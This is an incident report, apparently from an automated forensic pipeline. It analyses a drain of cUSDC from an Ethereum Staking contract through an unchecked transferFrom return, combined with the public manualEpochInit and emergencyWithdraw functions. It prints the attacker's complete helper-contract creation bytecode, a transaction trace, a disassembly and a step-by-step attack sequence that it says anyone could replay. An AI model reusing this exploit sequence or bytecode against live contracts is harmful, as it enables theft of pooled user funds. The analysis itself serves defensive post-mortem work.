# Ethereum Staking cUSDC Drain via Unchecked transferFrom Return

## Incident Overview TL;DR

On Ethereum mainnet, an unprivileged EOA 0x657a2b6fe37ced2f31fd7513095dbfb126a53601 used a purpose-built helper contract 0x7f1F536223d6a84Ad4897A675F04886cE1c3b7A1 to drain 128657759164064 units of cUSDC from Staking contract 0x245a551ee0F55005e510B239c917fA34b41B3461 in a single constructor-time transaction 0xa02b159fb438c8f0fb2a8d90bc70d8b2273d06b55920b26f637cab072b7a0e3e.

The Staking contract treats IERC20(tokenAddress).transferFrom as non-fallible for non-stable tokens and credits deposits even when transferFrom returns false; combined with permissionless manualEpochInit and emergencyWithdraw, this allows a helper contract to fabricate stake in cUSDC and then withdraw Staking’s pre-existing cUSDC holdings to the adversary EOA.

## Key Background

- Staking.sol at 0x245a551ee0F55005e510B239c917fA34b41B3461 maintains per-token epoch-based stakes, where manualEpochInit(token, epochId) is a public function that copies poolSize[token][epochId - 1] into poolSize[token][epochId] for epochId greater than zero, enabling any caller to backfill epochs as long as epoch ordering constraints are respected.
- For non-stable tokens such as cUSDC, Staking.deposit calls IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount) and, regardless of the returned boolean, increments balances[msg.sender][tokenAddress] and poolSize[tokenAddress][currentEpoch].size and emits a Deposit event, so accounting can diverge from actual token balances when transferFrom returns false.
- Staking.emergencyWithdraw allows a staker to withdraw their recorded balance for a token from the current epoch without waiting for rewards, transferring tokens from Staking to the caller; if balances[msg.sender][tokenAddress] has been inflated without a matching transferFrom, emergencyWithdraw sends real tokens that were previously deposited by others.
- cUSDC 0x39AA39c021dfbaE8faC545936693aC917d5E7563 is a Compound CErc20 implementation where transfer and transferFrom return false and emit a Failure event instead of reverting when a transfer cannot be executed, which interacts badly with callers that do not check the returned boolean.
- The helper contract 0x7f1F536223d6a84Ad4897A675F04886cE1c3b7A1 hard-codes the Staking and cUSDC addresses and uses tx.origin-based forwarding so that any cUSDC it receives from Staking is forwarded directly to the deploying EOA 0x657a2b6fe37ced2f31fd7513095dbfb126a53601 within the same transaction.

Pre-incident state definition:

Public Ethereum mainnet state immediately before inclusion of block 22957533 containing tx 0xa02b159fb438c8f0fb2a8d90bc70d8b2273d06b55920b26f637cab072b7a0e3e, where Staking contract 0x245a551ee0F55005e510B239c917fA34b41B3461 holds 128657759164064 units of cUSDC 0x39AA39c021dfbaE8faC545936693aC917d5E7563, EOA 0x657a2b6fe37ced2f31fd7513095dbfb126a53601 holds zero cUSDC, helper contract 0x7f1F536223d6a84Ad4897A675F04886cE1c3b7A1 does not yet exist, and the verified Staking.sol and CErc20 (cUSDC) sources define the behavior of manualEpochInit, deposit, emergencyWithdraw and transferFrom as recorded in the artifacts.

## Vulnerability Analysis

A permissionless combination of manualEpochInit, an unchecked transferFrom return in deposit for cUSDC, and emergencyWithdraw enables an unprivileged adversary to fabricate a stake backed by Staking’s own cUSDC balance and then withdraw that balance to an adversary-controlled EOA in a single transaction.

Vulnerable components:

- Staking contract 0x245a551ee0F55005e510B239c917fA34b41B3461 on Ethereum: manualEpochInit, deposit for non-stable tokens (including cUSDC), and emergencyWithdraw together allow internal balances to exceed real token balances when transferFrom returns false.
- cUSDC (CErc20) contract 0x39AA39c021dfbaE8faC545936693aC917d5E7563 on Ethereum: transfer and transferFrom return false instead of reverting on failure, which requires callers to check the returned boolean.

Security principles violated:

- Token transfer and transferFrom return values must be checked and enforced; accounting should not credit deposits when the underlying token transfer fails.
- Protocol accounting must maintain consistency between internal balance records and actual token balances held by the contract.
- Permissionless administrative-like functions such as manualEpochInit require careful interaction rules with deposit and withdrawal paths to avoid creating unbacked claims on pooled assets.

Key vulnerable logic in `Staking.sol` (deposit and emergencyWithdraw paths rely on unchecked `transferFrom` for non-stable tokens such as cUSDC):

```solidity
function deposit(address tokenAddress, uint256 amount, address referrer) public nonReentrant {
    require(amount > 0, "Staking: Amount must be > 0");
    bool isStableCoin = checkStableCoin(tokenAddress);

    require(IERC20(tokenAddress).allowance(msg.sender, address(this)) >= amount, "Staking: Token allowance too small");
    if (isStableCoin) {
        // stablecoin handling and Compound mint
    } else {
        IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);
    }
    // internal balance and pool accounting follow without checking transferFrom return value
}

function emergencyWithdraw(address tokenAddress) public {
    bool isStableCoin = checkStableCoin(tokenAddress);
    require(!isStableCoin, "Cant withdraw stable coins");
    require((getCurrentEpoch() - lastWithdrawEpochId[tokenAddress]) >= 10, "At least 10 epochs must pass without success");

    uint256 totalUserBalance = balances[msg.sender][tokenAddress];
    require(totalUserBalance > 0, "Amount must be > 0");

    balances[msg.sender][tokenAddress] = 0;
    IERC20(tokenAddress).transfer(msg.sender, totalUserBalance);
}
```

## Detailed Root Cause Analysis

Verified Staking.sol shows that manualEpochInit(token, epochId) is callable by any address and, when epochId is greater than zero, sets poolSize[token][epochId].size equal to poolSize[token][epochId - 1].size subject only to simple ordering constraints. The deposit function is also permissionless and, for non-stable tokens such as cUSDC 0x39AA39c021dfbaE8faC545936693aC917d5E7563, calls IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount) without checking the returned boolean. Immediately after this call, the function increments balances[msg.sender][tokenAddress] by amount and increases poolSize[tokenAddress][currentEpoch].size by amount, and emits a Deposit event. CErc20 (cUSDC) implements transferFrom so that it returns false and emits a Failure event instead of reverting when a transfer cannot be executed. This creates a mismatch: whenever cUSDC.transferFrom returns false, Staking records a successful deposit and increases internal balances and poolSize even though no cUSDC moved. In tx 0xa02b159fb438c8f0fb2a8d90bc70d8b2273d06b55920b26f637cab072b7a0e3e, helper contract 0x7f1F536223d6a84Ad4897A675F04886cE1c3b7A1 is deployed by EOA 0x657a2b6fe37ced2f31fd7513095dbfb126a53601. Its constructor calls Staking.getCurrentEpoch, then repeatedly calls manualEpochInit for cUSDC over epochIds 0 through 54, copying Staking’s existing cUSDC pool size forward across epochs while no new tokens are deposited. The helper then approves Staking for a large cUSDC allowance and calls Staking.deposit with tokenAddress=cUSDC and amount=128657759164064. The trace shows CErc20.transferFrom emitting a Failure event and returning false, while the subsequent Staking state diff shows balances[helper][cUSDC] and poolSize[cUSDC][currentEpoch].size increasing by 128657759164064. Immediately afterward, the helper invokes Staking.emergencyWithdraw for cUSDC with the same amount. This call transfers 128657759164064 cUSDC from Staking to the helper contract and then, via the helper’s tx.origin-based forwarding logic, transfers the same amount from the helper to the EOA. The cUSDC balance diff confirms that Staking’s cUSDC balance drops from 128657759164064 to 0 and the EOA’s cUSDC balance increases from 0 to 128657759164064 in this single transaction, while the helper’s cUSDC balance remains zero before and after. The root cause is the Staking deposit implementation that trusts the transferFrom return value for non-stable tokens, combined with an emergencyWithdraw path that faithfully pays out inflated internal balances drawn from Staking’s real token holdings.

Seed transaction trace for tx 0xa02b159fb438c8f0fb2a8d90bc70d8b2273d06b55920b26f637cab072b7a0e3e (constructor of the helper contract, showing repeated `manualEpochInit` and the deposit/emergencyWithdraw sequence):

```bash
# Seed transaction trace (cast run -vvvvv)
# Source: /home/wesley/TxRayExperiment/incident-202601011533/artifacts/root_cause/seed/1/0xa02b159fb438c8f0fb2a8d90bc70d8b2273d06b55920b26f637cab072b7a0e3e/trace.cast.log
Warning: This is a nightly build of Foundry. It is recommended to use the latest stable version. To mute this warning set `FOUNDRY_DISABLE_NIGHTLY_WARNING` in your environment. 

Executing previous transactions from the block.
Traces:
  [2252303] → new <unknown>@0x7f1F536223d6a84Ad4897A675F04886cE1c3b7A1(0x608060405234801561000f575f5ffd5b505f80546001600160a01b0319163217905561002961004e565b6100316101a7565b610039610229565b61004161031a565b610049610381565b610560565b5f5f5160206107b55f395f51905f526001600160a01b031663b97dd9e26040518163ffffffff1660e01b8152600401602060405180830381865afa158015610098573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100bc9190610466565b6040805160018082528183019092526001600160801b039290921692505f9190602080830190803683370190505090505f5160206107d55f395f51905f52815f8151811061010c5761010c610493565b6001600160a01b03909216602092830291909101909101525f5b828160ff16116101a2576040516375161c5760e11b81525f5160206107b55f395f51905f529063ea2c38ae9061016290859085906004016104a7565b5f604051808303815f87803b158015610179575f5ffd5b505af115801561018b573d5f5f3e3d5ffd5b50505050808061019a90610500565b915050610126565b505050565b60405163095ea7b360e01b81525f5160206107b55f395f51905f5260048201525f1960248201525f5160206107d55f395f51905f529063095ea7b3906044016020604051808303815f875af1158015610202573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610226919061052a565b50565b6040516370a0823160e01b81525f5160206107b55f395f51905f5260048201525f905f5160206107d55f395f51905f52906370a0823190602401602060405180830381865afa15801561027e573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102a29190610549565b604051633d14d1b760e21b81525f5160206107d55f395f51905f526004820152602481018290525f60448201529091505f5160206107b55f395f51905f529063f45346dc906064015f604051808303815f87803b158015610301575f5ffd5b505af1158015610313573d5f5f3e3d5ffd5b5050505050565b604051631bfc726f60e21b81525f5160206107d55f395f51905f5260048201525f5160206107b55f395f51905f5290636ff1c9bc906024015f604051808303815f87803b158015610369575f5ffd5b505af115801561037b573d5f5f3e3d5ffd5b50505050565b6040516370a0823160e01b81523060048201525f905f5160206107d55f395f51905f52906370a0823190602401602060405180830381865afa1580156103c9573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103ed9190610549565b60405163a9059cbb60e01b8152326004820152602481018290529091505f5160206107d55f395f51905f529063a9059cbb906044016020604051808303815f875af115801561043e573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610462919061052a565b5050565b5f60208284031215610476575f5ffd5b81516001600160801b038116811461048c575f5ffd5b9392505050565b634e487b7160e01b5f52603260045260245ffd5b604080825283519082018190525f9060208501906060840190835b818110156104e95783516001600160a01b03168352602093840193909201916001016104c2565b5050809250505060ff831660208301529392505050565b5f60ff821660ff810361052157634e487b7160e01b5f52601160045260245ffd5b60010192915050565b5f6020828403121561053a575f5ffd5b8151801515811461048c575f5ffd5b5f60208284031215610559575f5ffd5b5051919050565b6102488061056d5f395ff3fe608060405234801561000f575f5ffd5b5060043610610090575f3560e01c80636ea056a9116100635780636ea056a91461011c578063a3f632de146100cb578063a4563341146100e6578063b3cf914414610094578063e8f6daa914610101575f5ffd5b80635141219d14610094578063631b1d97146100cb578063689271c6146100e65780636937175714610101575b5f5ffd5b6100af73245a551ee0f55005e510b239c917fa34b41b346181565b6040516001600160a01b03909116815260200160405180910390f35b6100af73f650c3d88d12db855b8bf7d11be6c55a4e07dcc981565b6100af735d3a536e4d6dbd6114cc1ead35777bab948e364381565b6100af7339aa39c021dfbae8fac545936693ac917d5e756381565b61012f61012a3660046101b7565b610131565b005b5f54326001600160a01b03909116036100905760405163a9059cbb60e01b8152326004820152602481018290526001600160a01b0383169063a9059cbb906044016020604051808303815f875af115801561018e573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101b291906101ec565b505050565b5f5f604083850312156101c8575f5ffd5b82356001600160a01b03811681146101de575f5ffd5b946020939093013593505050565b5f602082840312156101fc575f5ffd5b8151801515811461020b575f5ffd5b939250505056fea26469706673582212209009d803abc4c2342e03305aa3d44e0a30d82a9f4e40b8d50073167a379e99bf64736f6c634300081c0033000000000000000000000000245a551ee0f55005e510b239c917fa34b41b346100000000000000000000000039aa39c021dfbae8fac545936693ac917d5e7563)
    ├─ [4634] Staking::getCurrentEpoch() [staticcall]
    │   └─ ← [Return] 54
    ├─ [28375] Staking::manualEpochInit([0x39AA39c021dfbaE8faC545936693aC917d5E7563], 0)
    │   ├─ emit ManualEpochInit(caller: 0x7f1F536223d6a84Ad4897A675F04886cE1c3b7A1, epochId: 0, tokens: [0x39AA39c021dfbaE8faC545936693aC917d5E7563])
    │   ├─  storage changes:
    │   │   @ 0xcd57184fa7f9c6778abfdb28b6b8334b071b8599eb948ef9838a13f42b76adbb: 0 → 1
    │   └─ ← [Stop]
    ├─ [29532] Staking::manualEpochInit([0x39AA39c021dfbaE8faC545936693aC917d5E7563], 1)
    │   ├─ emit ManualEpochInit(caller: 0x7f1F536223d6a84Ad4897A675F04886cE1c3b7A1, epochId: 1, tokens: [0x39AA39c021dfbaE8faC545936693aC917d5E7563])
    │   ├─  storage changes:
    │   │   @ 0x164709c2256fca7ec40855b4d0eb368472e57a8888b5274d4dce3a3b0f66dc7b: 0 → 1
    │   └─ ← [Stop]
    ├─ [29532] Staking::manualEpochInit([0x39AA39c021dfbaE8faC545936693aC917d5E7563], 2)
    │   ├─ emit ManualEpochInit(caller: 0x7f1F536223d6a84Ad4897A675F04886cE1c3b7A1, epochId: 2, tokens: [0x39AA39c021dfbaE8faC545936693aC917d5E7563])
    │   ├─  storage changes:
    │   │   @ 0x31f67e54352fc490541d2d28cfbe27ad2f283cf8af1a667c0a1ae40afcc88640: 0 → 1
    │   └─ ← [Stop]
    ├─ [29532] Staking::manualEpochInit([0x39AA39c021dfbaE8faC545936693aC917d5E7563], 3)
    │   ├─ emit ManualEpochInit(caller: 0x7f1F536223d6a84Ad4897A675F04886cE1c3b7A1, epochId: 3, tokens: [0x39AA39c021dfbaE8faC545936693aC917d5E7563])
    │   ├─  storage changes:
    │   │   @ 0xf191a4c10fb44acf8b0790ce2840e69a1a42913180dfc8456a4a2d1d7acfc4ef: 0 → 1
    │   └─ ← [Stop]
    ├─ [29532] Staking::manualEpochInit([0x39AA39c021dfbaE8faC545936693aC917d5E7563], 4)
    │   ├─ emit ManualEpochInit(caller: 0x7f1F536223d6a84Ad4897A675F04886cE1c3b7A1, epochId: 4, tokens: [0x39AA39c021dfbaE8faC545936693aC917d5E7563])
    │   ├─  storage changes:
    │   │   @ 0x8461c79b199954d4b3f049ff8d1be4a73102728d21d030a9302f304cdbb5171d: 0 → 1
    │   └─ ← [Stop]
    ├─ [29532] Staking::manualEpochInit([0x39AA39c021dfbaE8faC545936693aC917d5E7563], 5)
    │   ├─ emit ManualEpochInit(caller: 0x7f1F536223d6a84Ad4897A675F04886cE1c3b7A1, epochId: 5, tokens: [0x39AA39c021dfbaE8faC545936693aC917d5E7563])
    │   ├─  storage changes:
    │   │   @ 0xa8b0d2ff6aecf251b67c1a30b9f0f91fd2883a0271b15824ea09453a8bc711a7: 0 → 1
    │   └─ ← [Stop]
    ├─ [29532] Staking::manualEpochInit([0x39AA39c021dfbaE8faC545936693aC917d5E7563], 6)
    │   ├─ emit ManualEpochInit(caller: 0x7f1F536223d6a84Ad4897A675F04886cE1c3b7A1, epochId: 6, tokens: [0x39AA39c021dfbaE8faC545936693aC917d5E7563])
    │   ├─  storage changes:
```

cUSDC ERC20 balance diff over the same transaction confirms the drain from Staking to the adversary EOA:

```json
{
  "chainid": 1,
  "txhash": "0xa02b159fb438c8f0fb2a8d90bc70d8b2273d06b55920b26f637cab072b7a0e3e",
  "token": "0x39aa39c021dfbae8fac545936693ac917d5e7563",
  "block_number": 22957533,
  "block_number_before": 22957532,
  "balances": [
    {
      "address": "0x245a551ee0F55005e510B239c917fA34b41B3461",
      "before": "128657759164064",
      "after": "0",
      "delta": "-128657759164064",
      "before_hex": "0x00000000000000000000000000000000000000000000000000007503780856a0",
      "after_hex": "0x0000000000000000000000000000000000000000000000000000000000000000"
    },
    {
      "address": "0x7f1F536223d6a84Ad4897A675F04886cE1c3b7A1",
      "before": "0",
      "after": "0",
      "delta": "0",
      "before_hex": "0x0000000000000000000000000000000000000000000000000000000000000000",
      "after_hex": "0x0000000000000000000000000000000000000000000000000000000000000000"
    },
    {
      "address": "0x657a2b6fe37ced2f31fd7513095dbfb126a53601",
      "before": "0",
      "after": "128657759164064",
      "delta": "128657759164064",
      "before_hex": "0x0000000000000000000000000000000000000000000000000000000000000000",
      "after_hex": "0x00000000000000000000000000000000000000000000000000007503780856a0"
    }
  ]
}
```

## Adversary Flow Analysis

The adversary uses a single constructor-time transaction to deploy a helper contract that initializes epochs, fabricates a cUSDC stake via an unchecked transferFrom, and immediately executes emergencyWithdraw to move all of Staking’s cUSDC holdings to an adversary EOA.

Adversary-related accounts:

- 0x657a2b6fe37ced2f31fd7513095dbfb126a53601 (EOA: true, Contract: false): Sender of adversary-crafted seed transaction 0xa02b159fb438c8f0fb2a8d90bc70d8b2273d06b55920b26f637cab072b7a0e3e and direct recipient of the drained cUSDC according to the ERC20 balance diff.
- 0x7f1F536223d6a84Ad4897A675F04886cE1c3b7A1 (EOA: false, Contract: true): Helper contract deployed in the seed transaction, with bytecode that hard-codes the Staking and cUSDC addresses and forwards received tokens to tx.origin; execution trace shows it calling manualEpochInit, deposit and emergencyWithdraw on Staking and then forwarding cUSDC to the deploying EOA.

Victim accounts:

- Staking contract cUSDC pool at 0x245a551ee0F55005e510B239c917fA34b41B3461 on Ethereum (chainid 1)

Helper contract disassembly excerpt (showing hard-coded Staking and cUSDC addresses and a forwarding path to the deployer):

```bash
# Disassembly of helper contract 0x7f1F536223d6a84Ad4897A675F04886cE1c3b7A1
# Source: /home/wesley/TxRayExperiment/incident-202601011533/artifacts/root_cause/data_collector/iter_1/contract/1/0x7f1F536223d6a84Ad4897A675F04886cE1c3b7A1/disassemble/bytecode.asm
00000000: PUSH1 0x80
00000002: PUSH1 0x40
00000004: MSTORE
00000005: CALLVALUE
00000006: DUP1
00000007: ISZERO
00000008: PUSH2 0x000f
0000000b: JUMPI
0000000c: PUSH0
0000000d: PUSH0
0000000e: REVERT
0000000f: JUMPDEST
00000010: POP
00000011: PUSH1 0x04
00000013: CALLDATASIZE
00000014: LT
00000015: PUSH2 0x0090
00000018: JUMPI
00000019: PUSH0
0000001a: CALLDATALOAD
0000001b: PUSH1 0xe0
0000001d: SHR
0000001e: DUP1
0000001f: PUSH4 0x6ea056a9
00000024: GT
00000025: PUSH2 0x0063
00000028: JUMPI
00000029: DUP1
0000002a: PUSH4 0x6ea056a9
0000002f: EQ
00000030: PUSH2 0x011c
00000033: JUMPI
00000034: DUP1
00000035: PUSH4 0xa3f632de
0000003a: EQ
0000003b: PUSH2 0x00cb
0000003e: JUMPI
0000003f: DUP1
00000040: PUSH4 0xa4563341
00000045: EQ
```

Transaction-stage breakdown:

- **Helper contract deployment and wiring to Staking and cUSDC**: EOA 0x657a2b6fe37ced2f31fd7513095dbfb126a53601 deploys helper contract 0x7f1F536223d6a84Ad4897A675F04886cE1c3b7A1 whose bytecode hard-codes Staking 0x245a551ee0F55005e510B239c917fA34b41B3461 and cUSDC 0x39AA39c021dfbaE8faC545936693aC917d5E7563 and includes logic to forward tokens to tx.origin.
- **Epoch initialization and forged cUSDC deposit credit**: Within the constructor of the helper, calls to Staking.getCurrentEpoch and Staking.manualEpochInit for cUSDC over epochIds 0 through 54 prepare the epoch state, and a subsequent Staking.deposit call with amount 128657759164064 credits balances and poolSize for the helper even though CErc20.transferFrom emits a Failure and returns false, as shown by the trace and state diff.
- **Emergency withdrawal and transfer of cUSDC to adversary EOA**: The helper invokes Staking.emergencyWithdraw for cUSDC with amount 128657759164064, causing Staking to transfer that amount of cUSDC to the helper, which then forwards the same amount to the deploying EOA 0x657a2b6fe37ced2f31fd7513095dbfb126a53601; the cUSDC balance diff shows Staking’s cUSDC balance dropping to zero and the EOA’s cUSDC balance increasing by 128657759164064 while the helper’s balance remains zero.

## Impact & Losses

- Token: cUSDC, Amount: 128657759164064

Staking contract 0x245a551ee0F55005e510B239c917fA34b41B3461 loses its entire cUSDC balance of 128657759164064 units in block 22957533, and adversary EOA 0x657a2b6fe37ced2f31fd7513095dbfb126a53601 gains the same amount; balance and state diffs attribute this loss to a single adversary-crafted transaction rather than to broader systemic effects.

## References

- [1] Seed tx metadata, trace and cUSDC balance diff for helper deployment and drain: `/home/wesley/TxRayExperiment/incident-202601011533/artifacts/root_cause/seed/1/0xa02b159fb438c8f0fb2a8d90bc70d8b2273d06b55920b26f637cab072b7a0e3e`
- [2] Staking.sol verified source for 0x245a551ee0F55005e510B239c917fA34b41B3461: `/home/wesley/TxRayExperiment/incident-202601011533/artifacts/root_cause/data_collector/iter_1/contract/1/0x245a551ee0F55005e510B239c917fA34b41B3461/source/src/Staking.sol`
- [3] CErc20 (cUSDC) source for 0x39AA39c021dfbaE8faC545936693aC917d5E7563: `/home/wesley/TxRayExperiment/incident-202601011533/artifacts/root_cause/seed/1/0x39aa39c021dfbae8fac545936693ac917d5e7563/src/Contract.sol`
- [4] Helper contract disassembly for 0x7f1F536223d6a84Ad4897A675F04886cE1c3b7A1: `/home/wesley/TxRayExperiment/incident-202601011533/artifacts/root_cause/data_collector/iter_1/contract/1/0x7f1F536223d6a84Ad4897A675F04886cE1c3b7A1/disassemble/bytecode.asm`

## ACT Opportunity Summary

- Chain ID: 1 (Ethereum mainnet)
- Block height B: 22957533
- Seed transaction: 0xa02b159fb438c8f0fb2a8d90bc70d8b2273d06b55920b26f637cab072b7a0e3e (role: adversary-crafted)
- Inclusion feasibility: Type-2 contract-creation transaction from unprivileged EOA 0x657a2b6fe37ced2f31fd7513095dbfb126a53601 on Ethereum mainnet, included in block 22957533 with standard gas parameters and no special permissions. Any EOA with sufficient ETH for gas that submits the same calldata to the public mempool at that block height obtains the same helper deployment, epoch initialization, forged deposit credit, and emergencyWithdraw drain.

Success predicate (profit in cUSDC):

- Reference asset: cUSDC
- Adversary address: 0x657a2b6fe37ced2f31fd7513095dbfb126a53601
- Value before (cUSDC): 0
- Value after (cUSDC): 128657759164064
- Value delta (cUSDC): 128657759164064
- Fees in reference asset: not_computed_in_cUSDC_units

ERC20 balance_diff for tx 0xa02b159fb438c8f0fb2a8d90bc70d8b2273d06b55920b26f637cab072b7a0e3e shows cUSDC balance at Staking contract 0x245a551ee0F55005e510B239c917fA34b41B3461 decreasing from 128657759164064 to 0 and cUSDC balance at adversary EOA 0x657a2b6fe37ced2f31fd7513095dbfb126a53601 increasing from 0 to 128657759164064, with the helper contract holding zero cUSDC before and after the transaction. Net profit in this report is quantified as that exact cUSDC balance increase at the adversary address. Gas fees for the adversary are paid in ETH and are not converted into cUSDC units, so the fees_paid_in_reference_asset field is set to the literal string not_computed_in_cUSDC_units while the profit in cUSDC units remains fully determined by the balance diff.
